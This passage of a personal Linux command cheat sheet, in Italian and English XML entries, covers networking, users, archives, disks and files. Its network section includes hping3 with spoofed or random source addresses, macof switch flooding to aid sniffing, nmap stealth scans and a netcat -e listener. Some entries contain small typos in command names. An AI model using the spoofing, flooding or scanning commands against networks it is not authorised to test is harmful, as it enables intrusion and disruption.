La sezione e' un numero. visualizza i manuali dei comandi. -k &quot;parola&quot; cerca all'interno dei manuali la parola (vedere il comando apropos che fa una operazione simile). e' possibile fare una ricerca all'interno del documento. una volta entrati nel manuale digiare /&quot;parola&quot; 

</item>

<item name="sudo comando">
esegue un comando come root. il file /etc/sudoers contiene i nomi degli utenti autorizzatiad invocare sudo. Il comando &quot;sudo -i&quot; consente di utilizzare una console di root. Per abilitare in ubuntu il root digitare &quot;sudo passwd root&quot;; per disabilitare nuovamente digitare &quot;sudo passwd -l root&quot;.

</item>

<item name="chroot root dir comando">
permette di eseguire un comando cambiando la directory di root. Es. chroot /mnt/backtrack /bin/bash esegue la bash sul SO linux presente ne filesystem backtrack!!! Addirittura!

</item>

<item name="ldd /usr/bin/comando">
permette di fornire info sulle librerie (sorte di .dll) utilizzate dal comando

</item>

<item name="crontab">
esegue comandi ad una certa data. è necessario che sia attivo il demone crond(attivabile con /etc/rc2.d/S89cron start). -e modifica il file di conf -l lo visualizza -r lo rimuove

</item>


<item name="init 0123456Ss">
permette di spostarsi sui vari runlevel

</item>

<item name="telinit 0123456..">
simile a init

</item>

<item name="runlevel">
visualizza il livello di runlevel corrente

</item>

<item name="/etc/inittab">
permette di modificare i processi che si avviano sui vari runlevel. Ogni riga è del tipo id:run:azione:processo

</item>

<item name="/etc/rc.d/rc.local">
è letto da init in fase di avvio. all'interno si possono applicare i comandi che desideriamo avviare in fase di boot. conviene disabilitare i comandi che generano issue e issue.net che rappresentano banner informativi del proprio sistema. di seguito conviene eventualmente eliminarli con il comando # rm -fr /etc/issue.net /etc/issue

</item>

<item name="mesg opt">
permette di attivare(y) o disabilitare(n) la comunicazione tra utenti di sistema con l'utilizzo di diversi programmi

</item>

<item name="sh file.sh">
esegue degli script bash. Usa sh -c help per info su come costruire uno script shell. è possibile eseguire un file.sh anche in qst modo ./file.sh. in qst caso è necessario avere i permessi per farlo, che è possibile ottenere con chmod

</item>


<item name="whatis comando">
fornisce la descrizione di un comando. è utile il comando makewhatis per creare l'indice delle descrizioni.  il Comando apropos &quot;parola&quot; cerca all'interno di elencho whatis, può essere una alternativa a whatis

</item>

<item name="whereis comando">
individua il percorso del comando binario, tra cui anche i file di configurazione, i manuali ecc...

</item>

<item name="which comando">
restituisce il percorso di &quot;comando&quot; utile per capire se il comando e' stato installato

</item>

</dict>

<!--- ********************************** NETWORK ***************************************** -->
<dict name="network">
    <item name="hping">
        Modes are:
        *  --udp
        *  --tcp (default)
        *  --icmp
        *  --scan
        *  --listen
        *  --rawip

        Makes a traceroute:<command name="sudo hping3 --traceroute -V --udp www.google.com"/>

        Sends only one packet from port 6000 (-S syn/-A ack/-F fin) on 80 port:<command name="sudo hping3 -c 1 -V -S -p 80 -s 6000 192.168.1.1"/>
        Choose an arbitrary source IP and send packets to port 80 with interval 1500msec:<command name="sudo hping3 --spoof 1.2.3.4 -S 10.20.30.40 -p 80 -i u1500"/>
        Also with random source IP:<command name="sudo hping3 192.168.1.1 --udp --rand-source"/>

        Scan the port (using -S syn/-A ack/-F fin): <command name="sudo hping3 192.168.1.1 -S --scan 1-1024"/>
    </item>

    <item name="netcat">
        Listen to a port # 3005 and execute /usr/bin/w command when client connects:<command name="$ nc -l -p 3005 -e /usr/bin/w"/>
        Later just do:<command name="telnet localhost 3005"/>
    </item>

<item name="curl">
In generale, consente di trasferire documenti HTML request di tipo GET o POST e ricevere dal server response.
I parametri generali sono:
-v			Estremamente utile per fare debug. Mostra i messaggi che vengono trasferiti dal client al server e viceversa.
-i			Mostra i campi dell'header nascosti
-I			Mostra solo l'header.
-X "type"		Definisci il tipo di request (GET, POST, PUT...)
-u "user":"pass"	Permette l'autenticazione. Nel caso in cui non funziona provare con queste altre opzioni --ntlm, --digest, --negotiate o --anyauth (in base alla risposta che da il server)
-A "string"		Consente di cambiare il campo User-Agent dell'intestazione. A volte conviene mettere user-agent di un browser.
-L			Opzione molto utile. Specifica a curl di seguire l'url contenuto nel campo Location.
-H "string"		Personalizzazione dell'header. Ad esempio -H "Destination: http://moo.com/nowhere"
-b "name=string/file"	Consente di leggere i cookies
-c "file"		Scrive i cookies dopo l'operazione
-D "file"		Scrive gli header in questo file
-d "string"		Corpo di una richiesta POST. Conviene mandare i dati nello stesso ordine con cui un browser li manda.
-e "string"		Imposta un valore al campo Referer dell'intestazione
-G			Non molto utile. Serve solo per specificare che i dati contenuti in -d vengano usati per fare un HTTP GET piuttosto che un HTTP POST
I campi di una form che sono nascosti (ad esempio input type=hidden) vengono gestiti allo stesso modo degli altri. Gestisce automaticamente SSL.

Richiesta GET:<command name="curl -v -c cookies.txt -b cookies.txt -L &quot;www.hotmail.com/when/junk.cgi?birthyear=1905&amp;press=OK&quot;"/>
Richiesta POST:<command name="curl -v -c cookies.txt -b cookies.txt -L -d &quot;birthyear=1905&amp;press=%20OK%20&quot; www.hotmail.com/when/junk.cgi"/> dove l'indirizzo url lo si trova nella form nell'attributo action
Richiesta POST con dati codificati automaticamente:<command name="curl -c cookies.txt -b cookies.txt -L --data-urlencode &quot;name=I am Daniel&quot; www.example.com"/>
Richiesta PUT:<command name="curl -v -L -c cookies.txt -b cookies.txt -T uploadfile www.uploadhttp.com/receive.cgi"/>
Quando nella form è presente l'oggetto per uplodare file(ad esempio due oggetti nella form: input type=file name=upload e altro input type=submit name=press value=OK), esso può essere fatto tramite il seguente comando curl:<command name="curl -v -c cookies.txt -b cookies.txt -L -F upload=@localfilename -F press=OK [URL]"/>

To know the public IP of your machine:<command name="curl ifconfig.me"/>
</item>

<item name="arp">
Consente di ricavare l'indirizzo MAC a partire dall'indirizzo IP:<command name="arp 192.168.1.1"/>
</item>

<item name="nmap">
Ottimo host discovery:<command name="nmap -sP -n 192.168.1.0-255"/>
Ottimo scan di porte con pacchetti SYN:<command name="sudo nmap -sS -sV -n -A 192.168.1.1"/>
Ottimo scan di porte con pacchetti ACK:<command name="sudo nmap -sA -sV -n -A 192.168.1.1"/>
Ottimo scan di porte con pacchetti NULL:<command name="sudo nmap -sN -sV -n -A 192.168.1.1"/>
</item>

<item name="sshd-generate">
serve a generare la chiave pubb per una comunicazione con sshd

</item>

<item name="macof">
consente di fare flooding su uno switch per facilitare lo sniffing!

</item>

<item name="/usr/sbin/sshd">
attiva il servizio ssh con la chiave generata

</item>

<item name="lynx">
browser web su SHELL!!!!

</item>

<item name="ipcalc">
da info sull'ind IP. con -h trova il nome dell'host a partire dall' IP

</item>

<item name="route">
permette di visualizzare/manipolare la tabella di routing di un interfaccia di rete. -n premette di visualizzare la tabella. Es route add default gw 192.168.0.1 permette di aggiungere un regola della tabella, route add -host server.it reject permette di rifiutare un indirizzo

</item>

<item name="etherape">
programma che visualizza il traffico di rete. simile a wireshark

</item>

<item name="apachectl">
serve a start/stop apache

</item>

<item name="atftpd">
server FTP

</item>

<item name="slattach -p cslip -s 38400 ttyS1">
permette di creare un collegamento tra un interfaccia di rete e una linea seriale. -p &quot;prot&quot; indica il protocollo, -s &quot;speed&quot; indica la velocità

</item>

<item name="vncserver">
permette di attivare VNCServer è necessario specificare la password per l'accesso

</item>

<item name="minicom">
è una applicazione per la connessione telefonica ad un sistema, permettendo cosi di accedere ad un terminale del tipo ttyS0. Basta semplicemente inserire il numero di telefono dell'abitazione, username e password. Per accedere come root ricordare di abilitare l'accesso remoto sul terminale nel file /etc/securetty

</item>

<item name="ftp host port">
è un CLient FTP

</item>

<item name="ssh -l utente host">
versione sicura di telnet
Per comprimere i dati trasmessi e abilitare l'inoltro X11:<command name="ssh -X -C user@host"/>
It's possible to use the option -Y the X11 forward <command name="ssh -Y -C user@host"/>
The X11 forward automatically set the DISPLAY variable environment in order to have the right forward.
So, it's not necessary to set the DISPLAY variable.
Se si vuole avviare un'applicazione specificando un dato terminale:<command name="export DISPLAY=localhost:0.0"/>
Per mostrare i DISPLAY degli altri terminali attivi basta usare il comando who.
</item>

<item name="telnet [- l utente] [host [port]]">
telnet. -e [char] specifichi il carattere di escape per uscire dalla connessione

</item>

<item name="mail">
permette di spedire e ricevere posta da un utente ad un altro del sistema. mail -s &quot;oggetto&quot; -u &quot;utente&quot; invia un msg all utente, -f permette di visualizzare la casella di posta

</item>

<item name="talk utente@host opp talk pts/0">
permette di comunicare (non ho capito cm funziona). pts/0 specifica il terminale anziche l'utente

</item>

<item name="write utente-locale [tty]">
simile a talk ma unidirezionale, manda un messaggio ad un utente di un sistema. tty indica il terminale su cui spedire il messaggio

</item>

<item name="mutt">
client di posta elettronica

</item>

<item name="irc [nick] server.it">
chat. /join #canale permette di entrare in un canale, /leave #canale permette di lasciarlo, /list -MIN 5 -MAX 20 -PUBLIC -NAME lista i canali con un min di partecipanti 5 e un max 20, di tipo publico e ordinati per nome, /help lista di comandi, /quit esci. Esiste anche una chat migliore per console bitchx

</item>

<item name="netstat ">
    Shows all the connections active on the system.
    Shows all connection UDP, TCP and Unix:<command name="netstat -a"/>
    Only TCP/UDP connections:<command name="netstat -aut"/>
    Doesn't make a DNS resolution (more efficient):<command name="netstat -an"/>
    Shows the list Lista delle porte in ascolto:<command name="netstat -l"/>
    Continue monitoring of connection:<command name="netstat -c"/>
    Shows the processes with PID (use also lsof -i):<command name="netstat -pa"/>
    List of network interfaces:<command name="netstat -i"/>
    Kernel routing table:<command name="nestat -r"/>

Esiste un ulteriore comando denominato ss che consente di controllare i socket attivi sulla propria macchina

</item>

<item name="iptables">
fa da firewall per il filtraggio di pacchetti(non so bene)

</item>

<item name="ipchains -A input -j REJECT -s XXX.XXX.XXX.XXX -d 0/0 -p all">
inibisce le connessione al sistema da parte XXX.XXX.XXX.XXX, applicando una regola.

</item>

<item name="Client per dhcp con dhclient">
Per richiedere al server dhcp un indirizzo IP invocare il seguente comando:<command name="dhclient"/>
</item>

<item name="tcpdchk">
controlla la configurazione di TCP_WRAPPER segnalando config errate sui file /etc/hosts.deny /etc/hosts.allow

</item>

<item name="tcpdump -i eth0 -F file">
sniffa pacchetti sull'interfaccia di rete specificata, che verranno memorizzati su file. Esiste anche il comando ethereal
Display traffic about DNS:<command name="tcpdump -i eth1 'udp port 53'"/>
Display all FTP session to 202.54.1.5:<comand name="tcpdump -i eth1 'dst 202.54.1.5 and (port 21 or 20'"/>
Use wireshark to view detailed information about files:<command name="tcpdump -n -i eth1 -s 0 -w output.txt src or dst port 80"/>
</item>

<item name="ifconfig eth0 192.168.0.1/24">
può configurare una interfaccia di rete in caso di assenza del dhcp per esempio. 192.168.0.1 è indIP, /24 indica la netmask

</item>

<item name="/etc/inetd.conf">
(deprecata)permette di abilitare/disabilitare servizi in rete, andando a commentare con # le righe che nn interessano. è importante che qst file sia protetto e quindi conviene applicare il comando # chown root /etc/inetd.conf. inoltre può essere reso immutevole con # chattr +i /etc/inetd.conf. una volta apportate le modifiche al file di conf si aggiorna il demone con il comando # killall -HUP inetd

</item>

<item name="/etc/rc.d/rc.intet1">
script per l'avvio delle periferiche e interfacce di rete inet1.conf è il file di config dei parametri GW DHCP ecc si usa start (o restart) per avviarlo.

</item>

<item name="/etc/rc.d/rc.inet2">
script per l'avvio dei servizi di rete es ssh, telnet

</item>


<item name="/etc/rc.d/rc.wireless">
script per il wireless. Vi è inoltre il file wireless.conf

</item>


<item name="/etc/hosts.allow">
TCP_WRAPPERS Es. sshd: 193.207.49.111 host.server.org permette al sistema con ip 193.207.49.111 di connettersi al proprio sistema utilizzando il demone sshd

</item>
<item name="/etc/hosts.deny">
TCP_WRAPPERS  Es. #Accesso vietato a chiunque, in quanto i servizi sono bloccati, basta aggiungere ALL:ALL@ALL, PARANOID

</item>

<item name="/etc/aliases">
file che contiene alias di sistema, e permette di abilitare/disabilitare dei comandi. è necessario invocare il comando # /usr/bin/newaliases dopo 

</item>

<item name="/etc/hosts">
effettue il mapping nome host-&gt;indIP. ES. 127.0.0.1localhost

</item>


<item name="hostname nuovo nome">
consente (temporaneamente) di cambiare il nome del computer(host). Se lo si vuole rendere permanente cambiare il contenuto di /etc/hostname in &quot;nuovo nome&quot; e sostituire il contenuto di /etc/hosts con il nuovo nume, infine avviare /etc/init.d/hostname.sh

</item>

<item name="gpg">
    GESTIONE CHIAVI:
    
    Creare la directory di config in home in cui si inseriranno le chiavi:<command name="gpg"/>
    Generare le chiavi:<command name="gpg --gen-key"/>
    Esportare la kiave pubblica in formato ascii:<command name="gpg --export -a -o rsa_key"/>
    Importare una chiave per esempio di un altro utente:<command name="gpg --import new_key"/>
    Generare un certificato di revoca. E' consigliabile farlo non appena si genera una chiave e conservarlo in luogo sicuro:<command name="gpg --gen-revoke"/>

    
    Lista chiavi del portachiavi:<command name="gpg --list-keys"/>
    Lista firme:<command name="gpg --list-sigs"/>
    Lista impronte digitali:<command name="gpg --fingerprint"/>
    Lista chiavi private:<command name="gpg --list-secret-keys"/>


    Cancellare una chiave pubblica:<command name="gpg --delete-key UID"/>
    Cancellare una chiave privata:<command name="gpg --delete-secret-key UID"/>
    Modificare una chiave:<command name="gpg --edit-key UID"/>
    
    Firma di un certificato serve a garantire l'autenticità del certificato:
    Per firmare una chiave modificarla con --edit-key e eseguire il comando sign.
    
    CIFRARE E DECIFRARE:
    Due opzioni possono essere usate per entrambe: 
    -u UID/--local-user UID per indicare la kiave privata.
    -r/--recipient per modificare il destinatario.

    Cifrare un testo in formato ascii:<command name="gpg -a -e destinatario msg.txt"/>
    Decifrare un testo in stdout(usare -o file per stamparlo su file):<command name="gpg -d msg.txt.asc"/>

    AUTENTICAZIONE (firmare e verificare le firme):
    Firmare testo:<command name="gpg -s (o --sign) msg.txt"/>
    Firmare senza fare compressione:<command name="gpg --clearsign msg.txt"/>
    Firmare in un file separato (utile per file binari) puo' essere utile anche l'opzione --armor:<command name="gpg -b (o --detach-sign) msg.txt"/>

    Verifica di una firma (ovviamente e' necessaria la chiave pubblica del mittente):<command name="gpg --verify msg.txt.asc"/>

    CIFRATURA E FIRMA:
    Cifrare e firmare nello stesso tempo:<command name="gpg [-u mittente] [-r destinatario] [--armor] --sign -e msg.txt"/>
    NOTA: In ricezione, la firma deve essere verificata solo dopo aver decifrato il messaggio.
</item>


<item name="# grep Connect time&quot; /var/log/messages &gt; | awk '{min = $8} END {print min  minuti di connessione&quot;}'">
permette di conoscere il tempo di connessione

</item>
</dict>

<!--- ********************************** ACCOUNT E UTENTE ***************************************** -->
<dict name="account utente">

<item name="finger">
[-sl][utente][@macchina]ottieni info su un utente o sulla macchina, quale e' l'ultima volta che è acceduto al sistema. -s forma breve, -l forma estesa.

</item>

<item name="adduser">
&quot;utente&quot;aggiunge un utente

</item>

<item name="groupadd gruppo">
aggiunge un gruppo

</item>

<item name="passwd">
serve a cambiare la password

</item>

<item name="sudo">
Da rivedere

</item>

<item name="su">
permette di cambiare utente

</item>

<item name="whoami ">

</item>

<item name="who">
fornisce info sugli utenti connessi al sistema

</item>

<item name="w -f utente">
mostra gli utenti collegati al sistema e cosa stanno facendo.-f indica il terminale, IDLE indica il tempo in cui l'utente non ha fatto nulla, JCPU e' il tempo totale di CPU usato da quell'utente, PCPU e' il tempo totale di CPU usato per quel dato momento

</item>

</dict>

<!--- ********************************** COMPRESSORI E CONVERTITORI ***************************************** -->
<dict name="compressori convertitori">
    <item name="unrar">
        To UNRAR a compress file:<command name="unrar e file.rar path/to/dir"/>
    </item>
    <item name="tar -zcvf  archivio.tar.gz Directory/">
        Decomprimere un file comp_file.tar.gz:<command name="tar -vxzf comp-file.tar.gz"/>
        Usa -p per preservare i permessi ai file. 

        Comprimere i file in:<command name="tar -vzcf comp-file.tar.gz BLASSM MATGEN/MISC"/>

        To change the starting directory you can use -C option:<command name="tar -vczf foo.tar.gz -C /etc passwd hosts -C /lib libc.a"/>

        Per listare il contenuto di file-comp.tar.gz:<command name="tar -tf comp-file.tar.gz"/>

        Per appendere nuovi file:<command name="tar -rf comp-file.tar.gz"/>

        Per permette di creare a partire da archivio più volumi compressi da inserire su floppy:<command name="tar -cvfM /dev/fd0H1440 archivio/"/>
        Per riunire nuovamente i volumi:<command name="cat 1.tar 2.tar &gt; archivio.tar.gz"/>

    </item>
    <item name="convert jpg to pdf">
        With imagemagick:<command name="convert -verbose *.jpg salida.pdf"/>
    </item>
     <item name="join pdf files">
        With ghostscript:<command name="gs -dBATCH -dNOPAUSE -q -sDEVICE=pdfwrite -sOutputFile=finished.pdf file1.pdf file2.pdf"/>
    </item>

    <item name="compress pdf files">
        With ghostscript:<command name="gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/screen -dNOPAUSE -dQUIET -dBATCH -sOutputFile=output.pdf input.pdf"/>
    </item>


<item name="zip file.zip file">
comprime un file in file.zip. è possibile decomprimere con # unzip file.zip

</item>

<item name="bzip2 file / bunzip2 file">
Comprime/Decomprime un file

</item>


<item name="compress ">
comprime un file in tipo .Z Con -d lo decomprime

</item>

<item name="cpio">
un'altro ennesimo compressore

</item>


<item name="gzip file /gunzip file.gz">
comprime/decomprime file

</item>

<item name="catdoc file.doc">
fornisce in stdout il documento word .doc

</item>

<item name="pdftops .pdf .txt">
converte in .ps

</item>

<item name="pdftotext .pdf .txt">
converte in testo

</item>

<item name="dvipdfm -o file.pdf file.dvi">
converte da .dvi a .pdf

</item>

<item name="dvips -o file.ps file.dvi">
converte da .dvi .ps. Le opzioni -A -B permettono di creare un .ps con le pagine pari o con le pagine dispari.

</item>

<item name="enscript">
converte un file .txt in .ps o .rtf o .html

</item>

<item name="latex">
converte da .tex a .dvi che è un formato per la stampa

</item>

<item name="mencoder">
mencoder -idx out-1.ogv -ovc lavc -oac mp3lame -o output.avi converte un file .ogv in .avi

</item>

</dict>

<!--- ********************************** SISTEMA E HARDWARE ***************************************** -->
<dict name="sistema hardware">

<item name="xev">
consente di ottenere informazioni su eventi dei dispositivi di input quali tastiera e mouse

</item>

<item name="halt/ shutdown">
    To reboot:<command name="shutdown -r"/>
    To halt:<command name="shutdown -h"/>
    To reboot the system right now:<command name="shutdown -r now"/>
    To reboot the next minute with a message:<command name="shutdown -r +1 &quot;Restarting...&quot;"/>
    To cancel the shutdown:<command name="shutdown -c"/>
</item>

<item name="uname -a">
fonisce info sul sistema tra cui il nome della macchina. con -r da la versione del kernel. uname -r viene utilizzato per esempio in qst caso: apt-get install build-essential linux-kernel-`uname -r`

</item>

<item name="arch">
da informazione sull' architettura del sistema (es. i386)

</item>

<item name="lspcmcia(pccardctl)/lspci">
visualizza schede

</item>


<item name="lpc">
avvia un programma per la gestione delle code di stampa. Esistono comandi che possono essere visualizzati con ? o help &quot;comando&quot;

</item>

<item name="lsusb">
lista le usb

</item>

<item name="lshw">
mostra tutti i dispositivi hardware. Estremamente utile quando si vuole sapere il file in /dev/* corrispondente ad un dato dispositivo.

</item>

<item name="lpr -Plpt1 file">
Permette la stampa di un file. Dove lpt1 rappresenta la porta parallela, il dispositivo /dev/lpt1.

</item>

<item name="lprm num">
rimuove un processo di stampa indicato col numero num. i processi esistenti possono essere visualizzati con lpq

</item>

<item name="mpage -t -1 -Plp -bA4 documento.ps">
stampe un .ps -1 indica il num di pag per foglio, lp indica la porta parallela

</item>

<item name="lp file">
permette di formattare un file per la stampa aggiungendo ora, nome num di pag ecc

</item>

<item name="cdrecord -scanbus">
visualizza le periferiche CD

</item>

<item name="cdrecord -v speed=4 dev=0,0,0 -data dati.iso">
Masterizza. Esiste anche cdrdao per masterizzare

</item>

<item name="mkisofs">
opp genisoimagecrea file .iso. -r permette nomi lunghi dei file e generazione di subDir senza limite, permette inoltre di applicare permessi gruppi ecc, anche -D consente profodità illimitata per i filesystem iso9660, -input-charset definisce il set di caratteri da usare (il più comune è -input-charset cp437), -j creazione di un fs per il mondo MS windows, -b permette di produrre CD avviabile in boot. ES.  mkisofs -r -l -o immagine.iso dati/ è possibile montarlo in questo modo mount -t iso9660 -o ro,loop=/dev/loop0 immagine.iso /mnt/cdrom

</item>

<item name="dmesg -n">
permette di dare info avvenute all'avvio. con -n indichiamo il tipo di runlevel che ci interessa. Utile per conoscere il nome dei dispositivi Es. dmesg | grep ttyS permette di conoscere il nome del modem ecc

</item>


<item name="vlock">
blocca la console testo per evitare intrusioni. un comando analogo per X server è xlock

</item>


<item name="env/set">
visualizza le variabili d'ambiente. con set è possibile anche impostare variabili

</item>


<item name="alias">
Per abbreviare la digitazione di comandi con molte opzioni è possibile utilizzare gli alias

</item>

<item name="export">
assegna un valore ad una variabile name=value. Es. export PATH=$PATH:/usr/local/bin. Di solito si usa un delimitatore per valutare cio che e' variabile e cio che non lo e'. Es. PATH=${PATH}:.:${HOME}/myScripts. e' possibile all'interno di uno scripts dichiarare una variabile cosi CICCIO='ciao' opp MARIO='come va?' e successivamente esportarli in qst modo export CICCIO MARIO

</item>

<item name="uptime">
stampa il tempo trascorso da quando il sistema e' in funzione

</item>

<item name="play -v 10 file">
permette di aprire molti formati audio tra cui gli mp3. -v è l'opzione per il volume

</item>

</dict>

<!--- ********************************** FILESYSTEM E DISCHI ***************************************** -->
<dict name="filesystem dischi">

    <item name="create a RAM disk">
        In order to create a disk into the ram:
        <command name="mkdir -p /media/ramdisk"/>
        <command name="mount -t tmpfs -o size=2048M tmpfs /media/ramdisk"/>
        To unmount:<command name="umount /media/ramdisk"/>
    </item>

<item name="Ricavare l'UUID a partire dal file dev">
Restituisce l'uuid e il tipo di filesystem:<command name="sudo blkid /dev/xxx"/>
</item>


<item name="Tune percentuale spazio riservato">
    Set la percentuale di spazio riservato al 1% anziché a 5%:
    <command name="sudo tune -m 1 /dev/sda1"/>
    Controllare il reversed blocks:
    <command name="sudo  tune2fs -l /dev/sda1"/>
</item>

<item name="df">
visualizza info sui dischi

</item>

<item name="du -h -s">
fornisce info sullo spazio occupato del disco.

</item>

<item name="fdisk">
&quot;/dev/hda&quot;app per la gestione di partizione

</item>

<item name="qtparted ">
app per la gestione di partizione

</item>

<item name="mkreiserfs /dev/hda1">
crea un reiserfs

</item>

<item name="mk2fs">
&quot;/dev/hda1&quot;crea un ext2

</item>

<item name="mkswap">
&quot;/dev/hda1&quot;crea uno spazio swap

</item>

<item name="swapon">
&quot;/dev/hda1&quot;avviene subito dopo mkswap

</item>

<item name="mkfs &lt;dispositivo&gt; -t &lt;tipo file system&gt;">
crea filesystem. è un comando più generico degli altri

</item>

<item name="hdparm ">
[opt] &quot;/dev/hda&quot;verifica le prestazioni dei dischi. -t verifica le prestazioni in lettura,-T verifica le prestazioni della cache, -c [flag(es 1)] add supporto 32 bit, -d [flag(es 1)] add DMA, -k [flag(es. 1)] consente di mantenere le impostazioni fatte. quindi per l'esecuzione del prog all'avvio mettere hdparm -c1 -d1 -k1 /dev/sda per esempio in /etc/rc.d/rc.local

</item>

<item name="pwd">
indica la posizione corrente nel filesystem

</item>


<item name="/etc/fstab">
contiene info sui dati di montaggio di filesystem, è possibile impostare se un filesystem è di lettura (ro) o lettura/scrittura(rw) ecc. Esiste anche etc/mtab

</item>


<item name="mount">
monta un filesystem. i dati di montaggio sono collocati nel file /etc/fstab. Esistono in tutto tre forme di utilizzo del comando: 1)# mount -a [-fFnrsvw] [-t type] [-O optlist] monta i filesystem che sono presenti nel file /etc/fstab. con -t indichiamo il tipo di file system(per l'elenco ved man mount), -n permette di non modificare mtab, -F fa il montaggio simultaneo dei fs presenti sul file, -v verbose, -r monta il fs in read-only, -w monta il fs in read-write, -O è visto come un filtro per indicare quali filesystem montare in base ad una lista di opzioni (che possono essere viste su man mount) Es. se nel file è presente un riga: /dev/cdrom /mnt/cdrom iso9660 owner,noauto,ro 00 è possibile facilmente utilizzare mount in qst modo # mount /dev/cdrom oppure # mount /mnt/cdrom 2) #mount -l lista i filesystem esistenti(cioè visualizza il file /etc/mtab) 3) # mount [-fnrsvw] [-o options [,...]] device | dir è la forma più comune. Esistono altre due forme di utilizzo # mount --bind olddir newdir permette di creare una copia su un nuovo punto di mount; # mount --move olddir newdir permette di spostare il filesystem. Altri esempi: # mount /dev/cdrom -t iso9660 /mnt/cdrom permette di montare il cd-rom; mount -t iso9660 -o ro,loop=/dev/loop0 immagine.iso /mnt/cdrom permette di montare un file.iso, # mount monika:/mnt/nfs -t nfs /mnt/nfs permette di montare la partizione presente sul server monika in locale

</item>

<item name="umount /mnt/hda2">
operazione inversa del mount

</item>

</dict>

<!--- ********************************** GESTIONE FILE ***************************************** -->
<dict name="gestione file">

<item name="lsof">
    Shows open port with related process:<command name="lsof -i"/>
Visualizza i file aperti del sistema. Per ciascun file mostra il processo che lo ha aperto.
Se si vuole indicare una specifica cartella:<command name="lsof +D /media/usb"/>
Se si vuole indicare un intera partizione:<command name="lsof /dev/sdb1"/>
</item>


<item name="umask">
    Permette di cambiare i permessi alla creazione di un file o directory
    Per visualizzare il valore corrente in modo simbolico:<command name="umask -S"/>

    Per cambiare permettere la lettura scrittura e esecuzione per il proprietario e gli appartenenti al gruppo e altri solo la lettura:<command name="umask u=rwx,g=r,o=r"/>
</item>


<item name="read variable">
E' utilizzato negli script e consente la lettura dallo stdIn(tipicamente tastiera), la stringa andrÃ  in &quot;variabile&quot;. E' possibile redirigere in qst modo read &quot;var&quot; &lt; &quot;file&quot;

</item>

<item name="file file">
indica il formato di un file o dir

</item>

<item name="mktemp">
crea un file temporaneo univoco

</item>

<item name="find dir -name file">permette di ricercare file. 
Trovare tutti i file creati oggi:<command name="find -maxdepth 1 -mtime 0 -type f"/>
Cancellare le cartelle vuote:<command name="find . -type d -exec rmdir {} \;"/>
Cancellare tutti i file .pyc:<command name="find . -depth -type f -name *.pyc -exec rm {} \;"/>
Cancellare tutte le directory .svn: <command name="find . -depth -type d -name .svn -exec rm -Rf {} \;"/>

con -cmin &quot;minuti&quot; e mmin &quot;minuti&quot; fa la ricerca di file cambiati e modificati nell'arco di &quot;minuti&quot;. 
un utilizzo più complesso e' find ~/ -name 'core*' -exec &quot;comando&quot; {} \; che Cancella tutti i file core presenti nella directory home dell'utente. Con vicino &quot;COMANDO&quot; c'e' {}, allora find sostituisce &quot;{}&quot; con il percorso completo del file selezionato.

</item>

<item name="locate -e -i file /slocate file">
fa la ricerca come find, ma su un file indicizzato creato con il comando updatedb. locate controlla solo sul database, quindi i file ottenuti dai risultati possono non esistere. -e stampa solo i file veramente esistenti; -i igonra il case; -l num stampa i primi num risuktati.

</item>

<item name="updatedb">
-o &quot;file&quot; scrive il DB su &quot;file&quot;; --database-root &quot;Path&quot; fa lo scan solo a partire da path. controllare /etc/updatedb.conf per guardare le regole utilizzate.

</item>

<item name="cmp">
simile a diff

</item>

<item name="diff">
Denota differenze tra 2 o più file.-urN option.
Per creare una patch basta digitare:<command name="diff &quot;file&quot; &quot;file&quot; &gt; patch"/> oppure nel caso di patch binaria:<command name="diff -a --binary bin bin.2 &gt; patch"/>.
Al fine di applicare la patch ad un file usare il comando patch.
</item>

<item name="patch">
    Serve per applicare una patch (creata con il comando diff) ad un file vecchio:
    <command name="patch originfile diffpatch"/>. 
    Per patch binarie:<command name="patch -binary originfile diffpatch"/>.
    In realta', il file patch contiene gia' il file di destinazione su cui applicare la patch.
    Quindi, di solito si usa:<command name="patch -p0 &lt; patchfile"/>
    dove il numero dopo -p si riferisce a quanti leading slashes passare a partire della radice
    del percorso.
</item>

<item name="basename file">
restituisce il nome del file. utile per gli script per conoscere il nome dello script stesso con basename $0

</item>

<item name="dirname file">
simile a basename, ma visualizza il percorso e non il nome del file.

</item>

<item name="ls path">
lista i file di una directory. -a permette di visualizzare file nascosti (sono file che iniziano con . es .bash), -l da info su permessi dimensioni e proprietari

</item>

<item name="uniq file">
elimina in un file righe ripetute

</item>

<item name="more [numero di linea da cui partire] file">
permette di leggere il contenuto di un file un po alla volta. viene utilizzato in combinazione con comandi con la pipe es ls -a | more

</item>


<item name="ln file origin file link">
effettua un hard link collegandosi al numero inode del file rappresentando il file origine nella sua interezza. Con l'opzione -s è possibile creare un link simbolico che a collegamento al nome del file permettendo anche di cambiare i permessi.

</item>

<item name="rm file">
rimuove file e directory.-r rimuove anche il contenuto della directory, -i versione interattiva, -f forza la rimozione senza avvertirti nuovamente

</item>


<item name="rsync -avz --exclude pippo.* --delete &lt;server&gt;:/web/ web/">
permette di replicare una directory presente su un sistema server

</item>

<item name="dd">
    To copy an image to an pendrive:<command name="dd if=/home/nomeutente/nomefile.img of=/dev/sdb bs=10M"/>
</item>

<item name="cp">
copia un file. con -l fa un link; -i rende interattivo avvisandoti della sovrascrittura; -R copia ricorsivamente per le subDir; -d fa un backup dei file dest per evitare l'override; --preserve preserva alcuni attributi quali i link ad essi associati ecc

</item>

<item name="scp">
copia sicura con ssh<command name="scp file.tgz madrid@server.com:/"/>
Per limitare la banda durante la copia (ad es. di 10 kbs)<command name="scp -l10 pippo@serverciccio:/home/zutaniddu/* ."/>

</item>

<item name="rsync [opt] dirSour dirDest">
Fa una sincronizzazione dei dati veloce e flessibile per il backup. -a indica che si vuole ricorsione e che si vuole preservare permessi proprietari etc..,-z si effettua un trasferimento compresso, -g si preserva il gruppo, -r ricorsivo, -b si rinominano i files che si trovano gia' in destinazione e che potrebbero essere riscritti, -u controlla i time-stamp per verificare se il file gia' esistente in dest e piu' nuovo di quello che si sta trasferendo, in tal caso il file non viene trasmesso, -v verbose

</item>

<item name="chattr [opt] file /lschattr">
cambia gli attibuti di un file in ext2-3. (+/- add o sub attributi del tipo: i=lo rende immutevole; a=è possibile solo l'append; c=comprime direttamente sul disco; d candida per il backup con il comando &quot;dump&quot;; u=non cancellabile; R= applica ricorsivamente gli attibuti ai file di una cartella e delle sotto cartelle

</item>

<item name="chown proprietario file/dir">
permette di cambiare il proprietario del file. -R rende possibile la ricorsione per le subfile o subdir

</item>

<item name="chmod 700 file">
imposta i permessi. esiste la versione ottale, opp # chmod u+rwx,go-rwx gsg.tex

</item>

